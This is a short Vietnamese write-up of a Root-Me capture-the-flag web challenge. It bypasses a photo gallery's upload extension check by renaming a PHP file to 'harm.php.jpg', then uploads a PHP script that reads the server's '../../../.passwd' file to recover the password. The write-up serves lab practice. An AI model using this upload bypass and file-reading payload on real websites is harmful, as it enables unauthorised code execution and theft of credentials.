Rootme cho chúng ta biết password nằm ở file .passwd trong thư mục root, nhưng khi truy cập vào đó ta nhận được code 403, vậy không thể xem nội dung file theo cách thông thường



Có 1 gợi ý rất rõ ràng: `hack this photo galery by uploading PHP code`, vậy ta tìm đến chỗ upload ảnh up thử 1 file `harm.php` có nội dung đơn giản như sau:

```php
<? php echo 'Hello world'; ?>
```

nhưng kết quả là incorrect extension, có thể do server đã check extension của file tải lên. Do đó ta đổi tên file thành `harm.php.jpg` và upload lại, kết quả thành công và khi bấm vào đường dẫn của file sẽ ra nội dung sau:

> Hello world

Vậy ta biết file php đó vừa được thực thi. Viết 1 file `harm1.php` khác:

```php
 <?php
$file = fopen("../../../.passwd", "r");

while(! feof($file)) {
  $line = fgets($file);
  echo $line. "<br>";
}

fclose($file);
?> 
```

nhằm đọc toàn bộ nội dung file .passwd của hệ thống, thêm extension .jpg vào sau và upload, ta sẽ có được password